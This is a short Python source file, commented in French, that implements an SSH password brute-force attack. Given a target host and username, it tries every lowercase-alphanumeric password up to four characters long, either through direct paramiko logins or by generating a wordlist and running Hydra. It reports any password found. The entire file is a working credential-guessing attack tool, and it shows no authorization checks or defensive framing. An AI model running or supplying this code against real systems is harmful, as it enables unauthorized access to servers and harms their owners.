import paramiko
import itertools
import string
import subprocess

# Attaque par permutation (placeholder)
def brute_force_permutation(target, username, use_hydra=False, port=22, progress_callback=None, should_stop=None):
    def log(msg):
        if progress_callback:
            progress_callback(msg)
        else:
            print(msg)
    if use_hydra:
        log(f"Brute force permutation sur {target} avec Hydra pour l'utilisateur {username}")
        chars = string.ascii_lowercase + string.digits
        wordlist = "hydra_permutation.txt"
        with open(wordlist, "w") as f:
            for length in range(1, 5):
                for pwd_tuple in itertools.product(chars, repeat=length):
                    f.write(''.join(pwd_tuple) + "\n")
        try:
            result = subprocess.run([
                "hydra", "-l", username, "-P", wordlist, target, "ssh", "-s", str(port)
            ], capture_output=True, text=True)
            log(result.stdout)
        except Exception as e:
            log(f"Erreur lors de l'exécution d'Hydra : {e}")
    else:
        log(f"Brute force permutation sur {target} avec paramiko pour l'utilisateur {username}")
        chars = string.ascii_lowercase + string.digits
        for length in range(1, 5):
            for pwd_tuple in itertools.product(chars, repeat=length):
                if should_stop and should_stop():
                    log("Attaque interrompue par l'utilisateur.")
                    return
                password = ''.join(pwd_tuple)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, port=port, username=username, password=password, timeout=2)
                    log(f"Mot de passe trouvé: {password}")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    log(f"Echec avec: {password}")
                except Exception as e:
                    log(f"Erreur: {e}")
        log("Mot de passe non trouvé par permutation.")
